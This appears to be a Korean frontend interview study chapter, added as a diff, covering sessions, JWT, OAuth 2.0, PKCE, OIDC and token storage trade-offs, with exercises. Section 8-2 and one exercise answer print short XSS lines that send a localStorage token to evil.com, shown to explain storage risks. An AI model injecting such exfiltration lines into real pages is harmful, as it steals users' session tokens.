@@ -1,0 +1,485 @@
+
+> **★ 실무 필수 영역.** 세션, JWT, OAuth 2.0, PKCE, OIDC, 토큰 저장 위치 논쟁. FE 면접에서 가장 깊게 물어보는 주제 중 하나다.
+
+* * *
+
+## 0. 왜 "인증"이 필요한가 — 먼저 개념부터
+
+### 0-1. HTTP는 무상태 — 그래서 문제
+
+2-2에서 봤듯이 HTTP는 **무상태(Stateless)**다. 서버는 이전 요청을 기억하지 못한다.
+
+즉 로그인 이후 요청도, 서버 입장에서는 **"누군지 모르는 사람"**이 보낸 요청이다. 매번 "내가 alice다"를 증명해야 한다.
+
+```
+[브라우저]              [서버]
+  POST /login ──────▶
+            ◀────────  로그인 성공 (그런데 다음 요청에선 잊힘)
+
+  GET /my/orders ───▶
+            ◀────────  "누구세요?"
+```
+
+### 0-2. 해결: 증표를 매번 들고 가라
+
+방법은 결국 하나: **로그인 후 "너는 alice다"라는 증표를 서버가 발급**하고, 클라이언트가 **모든 요청에 그 증표를 첨부**한다.
+
+증표를 구현하는 방식이 두 가지 큰 갈래다.
+
+*   **세션**: 증표는 단순한 ID (예: `sid=abc123`). 실제 사용자 정보는 **서버의 저장소**에 있다.
+*   **토큰 (JWT)**: 증표 자체에 사용자 정보가 들어있다. 서명으로 위조 방지.
+
+이 챕터는 이 두 방식을 비교하고, 현대 웹에서 가장 많이 쓰는 **OAuth 2.0 / OIDC** 표준을 뜯어본다.
+
+### 0-3. 쿠키는 여기서 어떻게 들어오나
+
+HTTP에는 "요청에 자동으로 뭔가 첨부"하는 기본 메커니즘이 하나 있다. **쿠키(Cookie)**다.
+
+*   서버가 `Set-Cookie: sid=abc123` 헤더로 쿠키를 설정
+*   브라우저가 그 도메인에 대한 모든 요청에 `Cookie: sid=abc123`을 **자동 첨부**
+
+이 자동성 덕분에 세션 기반 인증이 성립한다. 자세한 쿠키 속성(HttpOnly, Secure, SameSite)은 [2-7. 브라우저 저장소](2%EB%8B%A8%EA%B3%84-7-%EB%B8%8C%EB%9D%BC%EC%9A%B0%EC%A0%80-%EC%A0%80%EC%9E%A5%EC%86%8C)에서 다룬다.
+
+### 0-4. 용어 정리
+
+| 용어 | 뜻 |
+|---|---|
+| **Authentication (인증, AuthN)** | 누구인지 확인 — "나 alice임을 증명" |
+| **Authorization (인가, AuthZ)** | 무엇을 할 수 있는지 — "alice가 admin 페이지 볼 권한" |
+| **Credential** | 증명 수단 (비밀번호, 지문, 토큰 등) |
+| **Session** | 로그인 후 만료까지의 "상태" — 서버가 기억 |
+| **Token** | 클라가 들고 다니는 자기 완결적 증표 |
+| **Claim** | 토큰이 담는 정보 조각 (사용자 ID, 권한 등) |
+
+* * *
+
+## 1. 인증 vs 인가
+
+*   **Authentication (인증)**: **누구인가** — 로그인, 본인 확인
+*   **Authorization (인가)**: **무엇을 할 수 있는가** — 권한 부여
+
+둘은 완전히 다르다. 로그인은 됐는데 관리자 페이지 접근 권한이 없는 경우가 "인증 O, 인가 X"다.
+
+HTTP 상태 코드의 `401 Unauthorized`는 이름과 달리 실제론 **인증** 실패를, `403 Forbidden`이 **인가** 실패를 의미한다. 이 용어 혼동은 자주 나오는 함정.
+
+* * *
+
+## 2. 세션 기반 인증
+
+### 2-1. 흐름
+
+```
+1. 클라 → 서버: POST /login { email, password }
+2. 서버: 검증 후 세션 ID 발급, 세션 저장소에 상태 저장
+3. 서버 → 클라: Set-Cookie: sessionId=abc123; HttpOnly; Secure
+4. 이후 요청마다 브라우저가 자동으로 쿠키 전송
+5. 서버: sessionId로 저장소에서 사용자 정보 조회
+```
+
+### 2-2. 특징
+
+*   **서버가 상태를 가짐** (stateful)
+*   쿠키로 세션 ID만 주고받음, 실제 데이터는 서버에
+*   로그아웃 = 서버에서 세션 삭제
+
+### 2-3. 수평 확장 이슈
+
+서버 여러 대로 늘리면 세션을 어느 서버가 알지? **공유 세션 저장소**(Redis, Memcached) 필요. 또는 **Sticky Session**으로 같은 사용자를 같은 서버로 라우팅 (but 부하 불균형).
+
+* * *
+
+## 3. JWT (JSON Web Token)
+
+### 3-1. 구조
+
+```
+xxxxx.yyyyy.zzzzz
+header.payload.signature
+```
+
+세 부분을 **점으로 구분**, 각각 Base64URL 인코딩.
+
+```javascript
+const [header, payload, signature] = token.split('.');
+JSON.parse(atob(header));
+// { "alg": "HS256", "typ": "JWT" }
+
+JSON.parse(atob(payload));
+// { "sub": "1234567890", "name": "Alice", "iat": 1516239022, "exp": 1516242622 }
+```
+
+### 3-2. 표준 클레임
+
+*   `iss` (Issuer): 발급자
+*   `sub` (Subject): 주체 (보통 사용자 ID)
+*   `aud` (Audience): 수신자
+*   `exp` (Expiration): 만료 시각 (Unix timestamp)
+*   `iat` (Issued At): 발급 시각
+*   `nbf` (Not Before): 이 시각 이전엔 무효
+
+### 3-3. ⚠️ 함정: JWT는 암호화가 아니다
+
+**Base64는 인코딩이지 암호화가 아니다**. Payload는 누구나 디코드 가능.
+
+```javascript
+atob("eyJzdWIiOiIxMjM0In0=");  // "{"sub":"1234"}"
+```
+
+민감 정보(비밀번호, 주민번호)를 JWT payload에 넣으면 **공개와 같다**. 필요하면 JWE (JSON Web Encryption)를 써야 한다.
+
+### 3-4. 서명 검증
+
+Signature는 `HMAC-SHA256(header + "." + payload, secret)` 또는 RSA 서명. **변조 감지용**.
+
+```
+클라가 payload를 수정 → signature가 맞지 않음 → 서버가 거절
+```
+
+### 3-5. 대칭 vs 비대칭
+
+*   **HS256 (HMAC)**: 발급자와 검증자가 **같은 비밀키** 공유. 간단하지만 키가 새면 위조 가능.
+*   **RS256 (RSA)**: 발급자는 개인키로 서명, 검증자는 공개키로 확인. **공개키를 여러 서비스가 공유**할 수 있어 MSA에 유리.
+
+### 3-6. 장점과 단점
+
+**장점**:
+
+*   Stateless → 수평 확장 용이
+*   토큰 자체가 신원 정보
+
+**단점**:
+
+*   **즉시 무효화 어려움**: 만료 전까지 유효. 탈취돼도 만료까지 기다려야 함
+*   토큰 크기가 세션 ID보다 큼 (매 요청마다 오버헤드)
+*   로그아웃 구현이 복잡 (blacklist 필요)
+
+* * *
+
+## 4. Access Token vs Refresh Token
+
+### 4-1. 역할 분리
+
+| | Access Token | Refresh Token |
+|---|---|---|
+| 용도 | API 호출 | Access 재발급 |
+| 수명 | 짧음 (~15분) | 긺 (~2주) |
+| 저장 | 메모리 권장 | HttpOnly 쿠키 권장 |
+| 전송 | 매 API 호출 | 재발급 시에만 |
+
+### 4-2. 왜 둘로 나누는가
+
+**Access Token을 짧게** 유지하면 탈취 피해가 작다. 그렇다고 매번 로그인시키면 UX 나쁨. 그래서 **Refresh Token으로 조용히 재발급**.
+
+### 4-3. Refresh Token Rotation
+
+사용할 때마다 새 Refresh Token 발급, 이전 것은 무효화.
+
+```
+1. Access 만료 감지
+2. POST /refresh { refreshToken: RT1 }
+3. 서버: RT1 유효 → 새 { AT2, RT2 } 발급, RT1 무효화
+4. 만약 공격자가 훔친 RT1로 다시 요청 → 서버는 이미 무효인 걸 확인 → 전 세션 폐기
+```
+
+**탈취 감지 기능**이 추가된다.
+
+### 4-4. Silent Refresh
+
+Access Token이 곧 만료될 때(예: 1분 전) 백그라운드에서 refresh 요청. 사용자는 아무것도 느끼지 못함.
+
+* * *
+
+## 5. OAuth 2.0
+
+### 5-1. 용어
+
+*   **Resource Owner**: 사용자
+*   **Client**: 내 앱 (예: 내 서비스)
+*   **Authorization Server**: 토큰 발급 서버 (예: Google)
+*   **Resource Server**: API 서버 (예: Google Drive API)
+
+"내 앱(Client)이 사용자의 Google Drive(Resource Server)에 접근할 권한을 사용자(Resource Owner)의 허락 하에 얻는 과정".
+
+### 5-2. Authorization Code Grant (★ 가장 안전, 표준)
+
+```
+1. 클라 → 인증 서버로 리다이렉트
+   GET /authorize?response_type=code&client_id=X&redirect_uri=Y&scope=Z&state=xxx
+
+2. 사용자가 로그인 + 동의
+
+3. 인증 서버 → 클라로 리다이렉트
+   GET redirect_uri?code=AUTH_CODE&state=xxx
+
+4. 클라의 백엔드 → 인증 서버
+   POST /token { grant_type: "authorization_code", code, client_id, client_secret, redirect_uri }
+
+5. 인증 서버 → 클라: { access_token, refresh_token, expires_in, ... }
+
+6. 클라가 Resource Server에 Access Token으로 요청
+```
+
+### 5-3. 왜 Code를 거치나
+
+**Access Token을 직접 리다이렉트 URL에 실어주면** URL이 히스토리·로그·Referer에 남아 노출 위험. **한 번 쓰면 버리는 Authorization Code**를 주고, 서버 대서버로 안전하게 교환한다.
+
+### 5-4. state 파라미터
+
+CSRF 방어. 클라가 랜덤 값을 만들어 보내고, 콜백에서 같은 값이 돌아왔는지 확인. 공격자가 악의적 코드를 클라에 주입하는 걸 막는다.
+
+### 5-5. 다른 Grant Type
+
+| Grant | 용도 | 현재 권장 |
+|---|---|---|
+| **Authorization Code** | 웹앱 (서버 있음) | ★ 표준 |
+| Authorization Code + PKCE | SPA, 모바일 | ★ 표준 |
+| Client Credentials | 서버 간 통신 | OK |
+| Device Code | TV, CLI | OK |
+| **Implicit** | SPA (옛날) | **Deprecated** |
+| **Resource Owner Password** | 자사 앱 | **Deprecated** |
+
+* * *
+
+## 6. PKCE (Proof Key for Code Exchange)
+
+### 6-1. 해결하는 문제
+
+**SPA/모바일은 Client Secret을 숨길 수 없다**. JS 번들에 넣으면 공개, 네이티브 앱에 넣어도 리버스 엔지니어링으로 털린다. 공격자가 Client Secret을 훔치면 Authorization Code를 가로채 Access Token을 얻을 수 있다.
+
+### 6-2. 동작
+
+```
+클라:
+  code_verifier = 랜덤 문자열 (43~128자)
+  code_challenge = SHA256(code_verifier) → Base64URL
+
+1. GET /authorize?...&code_challenge=CHALLENGE&code_challenge_method=S256
+2. 사용자 동의 후 code 발급
+3. POST /token { code, code_verifier }  ← 원본 verifier를 제출
+4. 서버: SHA256(code_verifier) === stored code_challenge 확인 → 통과 시 토큰 발급
+```
+
+공격자가 Authorization Code를 훔쳐도 **code_verifier를 모르면** 토큰 교환 불가.
+
+### 6-3. OAuth 2.1
+
+OAuth 2.1 초안에서 **Authorization Code에 PKCE가 사실상 필수**. 확실히 표준.
+
+* * *
+
+## 7. OIDC (OpenID Connect)
+
+### 7-1. OAuth vs OIDC
+
+*   **OAuth**: "이 앱이 내 Google Drive에 접근해도 된다" — 인가
+*   **OIDC**: "이 사용자가 누구인지" — 인증
+
+OIDC는 OAuth 2.0 위에 **인증 레이어**를 올린 표준. 대부분의 "Google/카카오로 로그인"이 OIDC다.
+
+### 7-2. ID Token
+
+OIDC가 추가로 발급. **JWT 형식**으로 사용자 정보를 담음.
+
+```json
+{
+  "iss": "https://accounts.google.com",
+  "sub": "user-id-123",
+  "aud": "my-client-id",
+  "exp": 1516242622,
+  "email": "alice@example.com",
+  "name": "Alice"
+}
+```
+
+클라가 이걸 검증하면 **"이 사용자가 누구인지"**를 신뢰할 수 있다.
+
+### 7-3. 추가 엔드포인트
+
+*   `/.well-known/openid-configuration`: OIDC 엔드포인트 자동 발견
+*   `/userinfo`: Access Token으로 사용자 상세 정보 조회
+*   `/jwks`: ID Token 검증용 공개키
+
+* * *
+
+## 8. 토큰 저장 위치 논쟁
+
+### 8-1. 비교표
+
+| 위치 | XSS 취약 | CSRF 취약 | 새로고침 생존 | 비고 |
+|---|---|---|---|---|
+| LocalStorage | **O** | X | O | JS 접근 → XSS 시 즉사 |
+| SessionStorage | O | X | 탭 단위 | 탭 종료 시 소실 |
+| Cookie (HttpOnly) | X | **O** | O | CSRF 방어 필요 |
+| 메모리 (변수) | X | X | **X** | 새로고침 소실 |
+
+### 8-2. XSS의 치명도
+
+```javascript
+// 공격자 스크립트가 한 줄이면 끝:
+fetch('https://evil.com?t=' + localStorage.getItem('token'));
+```
+
+**LocalStorage에 토큰을 두면 XSS 하나로 전체 사용자 토큰이 털린다**. 반면 HttpOnly 쿠키는 JS가 읽을 수 없어 XSS가 있어도 토큰 자체는 안전.
+
+### 8-3. CSRF의 방어
+
+HttpOnly 쿠키는 XSS엔 강하지만 CSRF엔 취약. 방어책:
+
+1.  **SameSite 쿠키**: `SameSite=Strict` 또는 `Lax` (대부분 Lax가 기본)
+2.  **CSRF 토큰**: 서버가 발급한 토큰을 헤더에 포함
+3.  **Double Submit Cookie**: 쿠키의 값과 body/header의 값이 같은지 체크
+
+### 8-4. 현실적 정답
+
+널리 받아들여지는 패턴:
+
+*   **Access Token**: 메모리 (JS 변수, 클로저, Zustand store)
+*   **Refresh Token**: HttpOnly + Secure + `SameSite=Strict` 쿠키
+*   **새로고침 대응**: 앱 부팅 시 쿠키의 Refresh Token으로 Access Token 재발급 (Silent Refresh)
+
+### 8-5. "왜 LocalStorage는 안 되는가"
+
+React/Vue가 기본적으로 이스케이프해도, **하나의 XSS 실수로 전부 털린다**. `dangerouslySetInnerHTML`, 서드파티 스크립트, 확장 프로그램, 컨텐트 스크립트… 입이 많다.
+
+Auth0, OWASP 등 대부분의 보안 가이드가 **LocalStorage에 토큰 저장 금지**를 명시.
+
+* * *
+
+## 9. 실전 Axios 인터셉터로 자동 재발급
+
+```javascript
+let accessToken = null;
+let refreshPromise = null;
+
+axios.interceptors.request.use(config => {
+  if (accessToken) config.headers.Authorization = `Bearer ${accessToken}`;
+  return config;
+});
+
+axios.interceptors.response.use(
+  r => r,
+  async error => {
+    if (error.response?.status !== 401) return Promise.reject(error);
+
+    // 동시에 여러 요청이 401을 받아도 refresh는 한 번만
+    if (!refreshPromise) {
+      refreshPromise = axios.post('/auth/refresh')
+        .then(r => { accessToken = r.data.accessToken; return accessToken; })
+        .finally(() => { refreshPromise = null; });
+    }
+
+    try {
+      const newToken = await refreshPromise;
+      error.config.headers.Authorization = `Bearer ${newToken}`;
+      return axios.request(error.config);
+    } catch (e) {
+      // 재발급 실패 → 로그아웃
+      window.location.href = '/login';
+      return Promise.reject(e);
+    }
+  }
+);
+```
+
+**핵심**:
+
+1.  Access Token은 메모리 변수
+2.  여러 요청이 동시에 401 받아도 refresh는 한 번만 (`refreshPromise` 재사용)
+3.  재발급 성공 시 자동 재시도
+4.  실패 시 로그인 페이지로
+
+* * *
+
+## 연습 문제
+
+1.  세션 기반 인증과 JWT 기반 인증의 수평 확장성을 비교하라.
+2.  JWT의 payload에 비밀번호를 넣으면 왜 안 되는지, 실제 base64 디코드 예시로 보여라.
+3.  OAuth 2.0 Authorization Code Grant의 흐름을 그림으로 그려라. `state` 파라미터는 어디에 쓰이는가?
+4.  PKCE가 해결하는 공격 시나리오를 단계별로 서술하라.
+5.  OIDC와 OAuth 2.0의 차이를 "내가 구글로 로그인하는" 맥락에서 설명하라.
+6.  Refresh Token을 LocalStorage에 저장하면 안 되는 이유를 XSS 시나리오로 설명하라.
+7.  Refresh Token Rotation이 탈취를 어떻게 감지하는지 서술하라.
+
+* * *
+
+## 연습 문제 정답
+
+### 1. 세션 vs JWT 수평 확장
+
+*   **세션**: 서버가 상태 보유 → 공유 저장소(Redis) 또는 Sticky Session 필요. 확장 비용.
+*   **JWT**: Stateless → 어느 서버가 받아도 로컬에서 검증. 확장 쉬움. 대신 로그아웃/무효화가 어려움.
+
+### 2. JWT Base64 디코드
+
+```javascript
+const token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicGFzc3dvcmQiOiJzZWNyZXQifQ.signature";
+JSON.parse(atob(token.split('.')[1]));
+// { username: "alice", password: "secret" }  ← 그대로 노출
+```
+
+누구나 디코드 가능하므로 민감 정보 금지.
+
+### 3. Authorization Code Grant 흐름
+
+```
+유저 → Client → Authorization Server (Login UI)
+유저 동의
+Authorization Server → Client (redirect_uri?code=XXX&state=YYY)
+Client 백엔드 → Authorization Server (code + secret)
+Authorization Server → Client (access_token, refresh_token)
+```
+
+`state`: 초기 요청 때 생성한 랜덤 값을 callback에서 동일한지 검증 → CSRF 방어.
+
+### 4. PKCE 공격 방어
+
+공격 시나리오: 공격자가 모바일 앱의 커스텀 URL scheme을 등록해 Authorization Code를 가로챈다.
+
+*   PKCE 없으면: 훔친 code + 공개된 client_id로 토큰 교환 가능
+*   PKCE: code 교환 시 `code_verifier` 필요. 공격자는 원본 verifier를 모르므로 실패
+
+### 5. OIDC vs OAuth
+
+**OAuth만**: "구글이 이 앱에게 이메일 주소 접근 권한을 줬다" — 무엇을 할 수 있는지.
+
+**OIDC**: "구글이 이 사용자가 alice@gmail.com임을 확인해줬다" — 누구인지.
+
+"구글로 로그인"은 실제로 **인증**이 목적이므로 OIDC. Access Token(리소스 접근)과 ID Token(사용자 정보) 둘 다 받음.
+
+### 6. LocalStorage XSS
+
+```javascript
+// 공격자 스크립트가 어떻게든 주입되면
+const token = localStorage.getItem('refreshToken');
+fetch('https://evil.com/steal?t=' + token);
+```
+
+한 줄로 모든 사용자의 Refresh Token이 공격자에게 전송. HttpOnly 쿠키면 JS가 읽을 수조차 없다.
+
+### 7. Refresh Token Rotation 탈취 감지
+
+정상 흐름: RT1 → 새 RT2 발급, RT1 즉시 무효.
+
+공격자가 중간에 RT1을 훔쳐 먼저 사용 → 서버가 RT2 발급 + RT1 무효. 이후 정당한 클라가 RT1을 다시 제출하면 서버는 "이미 쓰인 RT1"을 감지 → **전 세션 폐기**. 탈취당한 걸 시스템이 인지.
+
+* * *
+
+## 체크리스트
+
+*    인증과 인가의 차이를 401/403 예시로 설명할 수 있다
+*    세션 기반 인증의 흐름과 수평 확장 이슈를 안다
+*    JWT의 header/payload/signature 구조를 안다
+*    JWT가 암호화가 아님을 Base64 디코드로 보일 수 있다
+*    Access Token과 Refresh Token의 역할 분리를 안다
+*    Refresh Token Rotation의 탈취 감지 원리를 안다
+*    OAuth 2.0 Authorization Code Grant를 그릴 수 있다
+*    Authorization Code를 거치는 이유를 안다
+*    state 파라미터의 역할을 안다
+*    PKCE가 필요한 환경과 동작 원리를 안다
+*    OIDC와 OAuth 2.0의 차이를 안다
+*    토큰 저장 위치별 보안 트레이드오프를 표로 설명할 수 있다
+*    현실적 정답 (Access=메모리, Refresh=HttpOnly 쿠키)을 안다
+
+* * *
+
+**이전**: [2-3. 통신 프로토콜과 API 스타일](2%EB%8B%A8%EA%B3%84-3-%ED%86%B5%EC%8B%A0-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C%EA%B3%BC-API-%EC%8A%A4%ED%83%80%EC%9D%BC) | **다음**: [2-5. 브라우저 렌더링 과정](2%EB%8B%A8%EA%B3%84-5-%EB%B8%8C%EB%9D%BC%EC%9A%B0%EC%A0%80-%EB%A0%8C%EB%8D%94%EB%A7%81-%EA%B3%BC%EC%A0%95)
